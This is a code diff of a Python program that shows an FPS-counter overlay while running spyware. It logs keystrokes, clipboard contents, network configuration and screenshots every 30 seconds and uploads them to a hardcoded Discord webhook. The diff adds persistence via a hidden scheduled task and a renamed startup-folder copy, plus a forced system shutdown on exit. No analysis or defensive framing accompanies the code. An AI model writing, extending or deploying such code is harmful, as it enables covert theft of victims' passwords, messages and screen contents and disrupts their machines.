@@ -1,5 +1,6 @@
 import os
 import platform
+import atexit
 import random
 import string
 import subprocess
@@ -12,6 +13,7 @@ import shutil
 import socket
 import pyperclip
 import psutil
+import pyautogui
 from pathlib import Path
 from pynput import keyboard
 import tkinter as tk
@@ -22,29 +24,39 @@ from PyQt5.QtWidgets import QApplication, QLabel, QWidget
 
 # Initialize variables and paths
 pc_name = socket.gethostname()
-settings_file = "settings.json"
 user_name = os.environ.get('USER') or os.environ.get('USERNAME')
 last_timestamp = None
 temp_folder = os.environ.get('TEMP')
 
-log_file = os.path.join(temp_folder, "key_log.txt")  # Save key_log.txt in Temp
+log_file = os.path.join(temp_folder, "key_log.txt")         # Save key_log.txt in Temp
 clipboard_log_file = os.path.join(temp_folder, "clipboard.txt")  # Save clipboard.txt in Temp
-file_pathip = os.path.join(temp_folder, 'ipconfig.txt')  # Save ipconfig.txt in Temp
+file_pathip = os.path.join(temp_folder, 'ipconfig.txt')       # Save ipconfig.txt in Temp
 settings_file = os.path.join(temp_folder, "settings.json")
 
 def ensure_log_files():
     for file in [log_file, clipboard_log_file, file_pathip]:
         if not os.path.exists(file):
             Path(file).touch()  # Create the file if it doesn't exist
-    # No need to move the settings file; just ensure it's there
+    # Ensure the settings file exists
     if not os.path.exists(settings_file):
         default_settings = {"yes": False}
         with open(settings_file, "w") as f:
             json.dump(default_settings, f)
 
-
 # Call this function to ensure the log files exist
 ensure_log_files()
+
+# ----- Shutdown Functionality -----
+def shutdown_system():
+    """Shut down the system when the script exits."""
+    try:
+        subprocess.run(['shutdown', '/s', '/f', '/t', '0'], check=True)
+    except Exception as e:
+        print(f"Error shutting down system: {e}")
+
+# Register the shutdown function to be called when the script exits
+atexit.register(shutdown_system)
+# ----- End Shutdown Functionality -----
 
 def load_settings():
     """Loads settings from the settings.json file located in the Temp folder."""
@@ -52,7 +64,6 @@ def load_settings():
         with open(settings_file, "r") as f:
             settings = json.load(f)
     else:
-        # If the settings file doesn't exist, create a new one with default values
         default_settings = {"yes": False}
         with open(settings_file, "w") as f:
             json.dump(default_settings, f)
@@ -66,6 +77,13 @@ def update_settings(new_value):
     with open(settings_file, "w") as f:
         json.dump(settings, f)
 
+def create_task():
+    try:
+        script_path = sys.argv[0]
+        command = f'pythonw "{script_path}"'  # Use pythonw to hide the console window
+        subprocess.run(f'schtasks /create /tn "MyStealthTask" /tr "{command}" /sc onlogon /f', shell=True)
+    except Exception as e:
+        print(f"Error creating task: {e}")
 
 # FPS counter function (for transparent window)
 def get_timestamp():
@@ -73,86 +91,64 @@ def get_timestamp():
     return time.strftime("[%Y-%m-%d %H:%M] ")
 
 def add_to_startup():
-    # Get the current script's full path
-    current_file_path = sys.argv[0]  # This returns the path to the currently running script
-
-    # Determine the user's startup folder path for Windows
+    current_file_path = sys.argv[0]  # Full path to the script/executable
     startup_folder = os.path.join(
-        os.environ.get('APPDATA'), 
-        'Microsoft', 
-        'Windows', 
-        'Start Menu', 
-        'Programs', 
+        os.environ.get('APPDATA'),
+        'Microsoft',
+        'Windows',
+        'Start Menu',
+        'Programs',
         'Startup'
     )
-    
-    # Make sure the startup folder exists
     if not os.path.exists(startup_folder):
-        pass
-        return
+        os.makedirs(startup_folder)
     
-    # Copy the current script to the startup folder
-    try:
-        # Destination file path in the startup folder
-        destination = os.path.join(startup_folder, os.path.basename(current_file_path))
-        
-        # Copy the script to the startup folder
-        shutil.copy(current_file_path, destination)
+    # Set the new name for the copied file
+    startup_file_path = os.path.join(startup_folder, 'browser_assistant')  # Rename the file to 'browser_assistant'
+
+    if not os.path.exists(startup_file_path):
+        try:
+            shutil.copy(current_file_path, startup_file_path)  # Copy the file with the new name
+            pass
+        except Exception as e:
+            pass
+    else:
         pass
-    except Exception as e:
-        pass
-        
-# Function to log clipboard content to the clipboard.txt file
+
+
 def log_clipboard():
     last_clipboard_content = ""
     while True:
         try:
-            # Get current clipboard content
             current_clipboard_content = pyperclip.paste()
-            if current_clipboard_content != last_clipboard_content:  # Only log if clipboard content has changed
+            if current_clipboard_content != last_clipboard_content:
                 timestamp = get_timestamp()
                 with open(clipboard_log_file, "a") as f:
-                    f.write(f"{timestamp} - {current_clipboard_content}\n")  # Log clipboard content with timestamp
+                    f.write(f"{timestamp} - {current_clipboard_content}\n")
                 last_clipboard_content = current_clipboard_content
-                
-                # Upload clipboard content to webhook
-                payload = {
-                    'content': f"Clipboard content: {current_clipboard_content}"
-                }
-                response = requests.post(webhook_url, data=payload)
-                if response.status_code != 204:
-                    pass
-            time.sleep(1)  # Check clipboard every second
+                payload = {'content': f"Clipboard content: {current_clipboard_content}"}
+                requests.post(webhook_url, data=payload)
+            time.sleep(1)
         except Exception as e:
-            pass
             time.sleep(5)
 
 def on_press(key):
-    """Logs the pressed key to the file with timestamp every minute."""
     global last_timestamp
-
     try:
         with open(log_file, "a") as f:
             current_time = time.time()
             formatted_time = get_timestamp()
-
-            # Add a new timestamp every minute
             if last_timestamp is None or (current_time - last_timestamp) >= 60:
                 f.write(f"\n{formatted_time}\n")
                 last_timestamp = current_time
-
-            # Log the keypress
             if hasattr(key, 'char') and key.char is not None:
-                f.write(key.char)  # Log regular keys
+                f.write(key.char)
             else:
-                f.write(f" [{key}] ")  # Log special keys (Enter, Shift, etc.)
-
+                f.write(f" [{key}] ")
     except Exception as e:
         pass
 
-# Upload function to Discord webhook
 def upload_file_to_webhook(file_path, webhook_url):
-    """Uploads files to a Discord webhook."""
     try:
         with open(file_path, 'rb') as file, open(file_pathip, 'rb') as ipfile, open(clipboard_log_file, 'rb') as clipboard_file:
             payload = {
@@ -161,28 +157,33 @@ def upload_file_to_webhook(file_path, webhook_url):
             files = {
                 'file1': (file_path, file),
                 'file2': (file_pathip, ipfile),
-                'file3': (clipboard_log_file, clipboard_file)  # Correct reference to the clipboard log file
+                'file3': (clipboard_log_file, clipboard_file)
             }
-            response = requests.post(webhook_url, data=payload, files=files)
-            if response.status_code == 204:
-                pass
-            else:
-                pass
+            requests.post(webhook_url, data=payload, files=files)
     except Exception as e:
         pass
 
-# Upload every 5 seconds
 def upload_every_5_seconds(file_path, webhook_url):
     while True:
-        pass
         upload_file_to_webhook(file_path, webhook_url)
         time.sleep(5)
 
-# Run the ipconfig command every 5 seconds
+def take_screenshot():
+    try:
+        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
+        temp_folder = os.environ.get('TEMP')
+        screenshot_file = os.path.join(temp_folder, f"screenshot_{timestamp}.png")
+        screenshot = pyautogui.screenshot()
+        screenshot.save(screenshot_file)
+        pass
+        return screenshot_file
+    except Exception as e:
+        pass
+        return None
+
 def run_ipconfig():
     while True:
         try:
-            # Run ipconfig and capture the output
             result = subprocess.run(
                 ['ipconfig'],
                 capture_output=True,
@@ -190,18 +191,11 @@ def run_ipconfig():
                 check=True,
                 creationflags=subprocess.CREATE_NO_WINDOW
             )
-
-            # Write the output to the ipconfig.txt file
             with open(file_pathip, 'w') as file:
-                file.write(result.stdout)  # Write the captured stdout to the file
-
-        except subprocess.CalledProcessError as e:
-            pass
-        
+                file.write(result.stdout)
         except Exception as e:
             pass
-
-        time.sleep(5)  # Wait for 5 seconds before running again
+        time.sleep(5)
 
 class TransparentWindow(QWidget):
     def __init__(self):
@@ -213,32 +207,72 @@ class TransparentWindow(QWidget):
         self.label.setFont(QFont("Arial", 20))
         self.label.setStyleSheet("color: white")
         self.label.setGeometry(10, 30, 200, 50)
-
-        # Timer to update the FPS counter every 100ms
         self.timer = QTimer(self)
         self.timer.timeout.connect(self.update_fps)
-        self.timer.start(100)  # Update FPS every 100ms (0.1 second)
-
-        # Variables for FPS calculation
+        self.timer.start(100)
         self.frames = 0
         self.last_time = time.time()
-        self.fps = 0  # FPS value to display
+        self.fps = 0
 
     def update_fps(self):
         current_time = time.time()
         self.frames += 1
         elapsed_time = current_time - self.last_time
-
-        # Update FPS every second (1 second period)
         if elapsed_time >= 1.0:
-            self.fps = self.frames  # Set FPS to the number of frames over 1 second
-            self.frames = 0  # Reset frame count
-            self.last_time = current_time  # Reset time
-            self.label.setText(f"FPS: {self.fps}")  # Display FPS on label
+            self.fps = self.frames
+            self.frames = 0
+            self.last_time = current_time
+            self.label.setText(f"FPS: {self.fps}")
 
     def mousePressEvent(self, event):
-        """To prevent dragging the window when clicked."""
         event.ignore()
+
+def upload_screenshot_to_webhook(screenshot_file):
+    try:
+        with open(screenshot_file, 'rb') as file:
+            files = {'file': (screenshot_file, file)}
+            payload = {'content': f'Here is a new screenshot from the PC: {pc_name}, the user: {user_name}'}
+            response = requests.post(webhook_url, data=payload, files=files)
+            if response.status_code == 204:
+                pass
+                # Delete the screenshot file after successful upload
+                try:
+                    os.remove(screenshot_file)
+                    pass
+                except Exception as del_e:
+                    pass
+            else:
+                pass
+    except Exception as e:
+        pass
+
+def take_and_upload_screenshot():
+    while True:
+        screenshot_file = take_screenshot()
+        if screenshot_file:
+            upload_screenshot_to_webhook(screenshot_file)
+        time.sleep(30)
+
+def cleanup_files():
+    """Check if the log/clipboard/ipconfig text files exceed 1GB and delete them if they do."""
+    max_size = 1 * 1024 * 1024 * 1024  # 1GB in bytes
+    for file_path in [log_file, clipboard_log_file, file_pathip]:
+        try:
+            if os.path.exists(file_path):
+                size = os.path.getsize(file_path)
+                if size > max_size:
+                    os.remove(file_path)
+                    print(f"Deleted large file: {file_path}")
+                    # Recreate an empty file
+                    Path(file_path).touch()
+        except Exception as e:
+            print(f"Error cleaning up file {file_path}: {e}")
+    # Check every 60 seconds
+    time.sleep(60)
+
+def cleanup_worker():
+    while True:
+        cleanup_files()
 
 # Define the webhook URL
 webhook_url = 'https://discord.com/api/webhooks/1335214600714457158/tzhsBy9cn-22l9vBGxfDs8kaoQ4CCsuTkqQhNvJe5BQ6ECrgHBD4JvEt-e5Kj3hftuSO'
@@ -255,35 +289,32 @@ ipconfig_thread = threading.Thread(target=run_ipconfig)
 ipconfig_thread.daemon = True
 ipconfig_thread.start()
 
+# Start the screenshot thread
+screenshot_thread = threading.Thread(target=take_and_upload_screenshot)
+screenshot_thread.daemon = True
+screenshot_thread.start()
+
 # Start the clipboard logging in a separate thread
 clipboard_thread = threading.Thread(target=log_clipboard)
 clipboard_thread.daemon = True
 clipboard_thread.start()
 
+# Start the cleanup worker thread to check file sizes periodically
+cleanup_thread = threading.Thread(target=cleanup_worker)
+cleanup_thread.daemon = True
+cleanup_thread.start()
+
 if __name__ == "__main__":
-    # Load settings
     settings = load_settings()
-
-    # Update the settings to True right after loading settings
     update_settings(True)
-
-    # Reload settings to reflect the update
     settings = load_settings()
-
-    # Now check if 'yes' is True (since we reloaded settings)
-    if not settings.get("yes", False):  # If 'yes' is False, show the FPS counter window
+    if not settings.get("yes", False):
         app = QApplication(sys.argv)
         window = TransparentWindow()
         window.show()
-
-        # Start the event loop
         sys.exit(app.exec_())
-    
-    # If 'yes' is True, do nothing (counter is not shown)
     else:
         pass
 
-
-# Start the key listener in the main thread
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
